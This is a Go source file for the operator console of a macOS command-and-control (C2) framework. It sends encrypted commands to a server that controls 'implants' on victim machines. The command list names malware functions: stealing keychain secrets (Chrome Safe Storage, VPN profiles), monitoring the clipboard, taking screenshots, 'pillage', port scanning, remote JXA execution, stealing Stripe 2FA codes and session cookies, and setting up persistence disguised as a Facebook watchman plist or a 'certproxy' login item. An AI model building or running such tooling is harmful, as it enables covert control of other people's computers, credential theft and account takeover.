package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"net"
	"sort"
	"strings"
	"time"

	"github.com/chzyer/readline"
	encryption "github.com/grines/TCPMacDuoC2/common"
)

var (
	serverIP   string
	serverPort string
)

func init() {
	flag.StringVar(&serverIP, "ip", "0.0.0.0", "IP address of the server")
	flag.StringVar(&serverPort, "port", "8009", "Port of the server")
}

const (
	serverAddress = "0.0.0.0:8009"
	CLIPSK        = "thisiscoolthisiscool1234"
)

type ClientCLI struct {
	conn net.Conn
}

func NewClient(address string) (*ClientCLI, error) {
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return nil, err
	}

	return &ClientCLI{conn: conn}, nil
}

func (c *ClientCLI) Close() {
	c.conn.Close()
}

func (c *ClientCLI) Reconnect() error {
	var err error
	for {
		c.conn, err = net.Dial("tcp", serverAddress)
		if err == nil {
			return nil
		}

		fmt.Printf("Reconnect failed: %v. Retrying in 5 seconds...\n", err)
		time.Sleep(5 * time.Second) // Wait for 5 seconds before retrying
	}
}

func (c *ClientCLI) SendCommand(command string) (string, error) {
	encryptedCommand, err := encryption.Encrypt(command, CLIPSK)
	if err != nil {
		return "", err
	}

	_, err = c.conn.Write([]byte(encryptedCommand + "\n"))
	if err != nil {
		if err := c.Reconnect(); err != nil {
			return "", err
		}
		// Try to send the command again after reconnecting
		_, err = c.conn.Write([]byte(encryptedCommand + "\n"))
		if err != nil {
			return "", err
		}
	}

	response, err := bufio.NewReader(c.conn).ReadString('\n')
	if err != nil {
		return "", err
	}

	decodedOutput, err := base64.StdEncoding.DecodeString(strings.TrimSpace(response))
	if err != nil {
		return "", err
	}

	decryptedOutput, err := encryption.Decrypt(string(decodedOutput), CLIPSK)
	if err != nil {
		return "", err
	}

	return decryptedOutput, nil
}

func main() {
	flag.Parse()

	serverAddress := serverIP + ":" + serverPort

	// List of commands extracted from the case switches
	commands := []string{
		"askpass",
		"cat",
		"cd",
		"clipboard",
		"clipmon",
		"clipmonstop",
		"clipmonview",
		"cp",
		"curl",
		"download",
		"env",
		"go-sc 2fa remove",
		"go-sc 2fa",
		"jxaremote",
		"jobs",
		"keychain",
		"keychain Viscosity/1/ovpn",
		"keychain Chrome Safe Storage",
		"kill",
		"ls",
		"mv",
		"persist_launchd com.github.facebooks.watchman.plist /usr/bin/whoami",
		"persist_loginitem certproxy /usr/bin/whoami",
		"pillage",
		"ping",
		"portscan",
		"ps",
		"pwd",
		"remotejxa",
		"rm",
		"screenshot",
		"stripe_2fa",
		"stripe_cookie",
		"stripe_cookie_destroy",
		"stripe_cookie_stop",
		"unsafe_jxa",
		"upload",
		"whoami",
	}

	// Sort the commands alphabetically
	sort.Strings(commands)

	client, err := NewClient(serverAddress)
	if err != nil {
		fmt.Println("Error connecting to server:", err)
		return
	}
	defer client.Close()

	fmt.Println("Connected to server at", serverAddress)

	rl, err := readline.New("> ")
	if err != nil {
		fmt.Println("Error setting up readline:", err)
		return
	}
	defer rl.Close()

	// Set up autocomplete
	rl.Config.AutoComplete = readline.NewPrefixCompleter(
		readline.PcItemDynamic(func(prefix string) []string {
			var items []string
			for _, cmd := range commands {
				if strings.HasPrefix(cmd, prefix) {
					items = append(items, cmd)
				}
			}
			return items
		}),
	)

	for {
		command, err := rl.Readline()
		if err != nil { // io.EOF, readline.ErrInterrupt
			break
		}

		if command == "" {
			continue
		}

		response, err := client.SendCommand(command)
		if err != nil {
			fmt.Println("Error:", err)
			continue
		}

		promptUpdate(rl, client)
		fmt.Println(response)
	}
}

func promptUpdate(rl *readline.Instance, client *ClientCLI) {
	if rl == nil {
		return // Safeguard against nil readline instance
	}

	currentClientDir, err := client.SendCommand("pwd\n")
	if err != nil {
		rl.SetPrompt("Implant > ")
		return
	}

	currentClient, err := client.SendCommand("current\n")
	if err != nil || currentClient == "-1" {
		currentClient = "None"
	}

	if currentClientDir == "No implant selected" {
		currentClientDir = ""
	}

	rl.SetPrompt(fmt.Sprintf("Implant %s - %s> ", currentClient, currentClientDir))
}
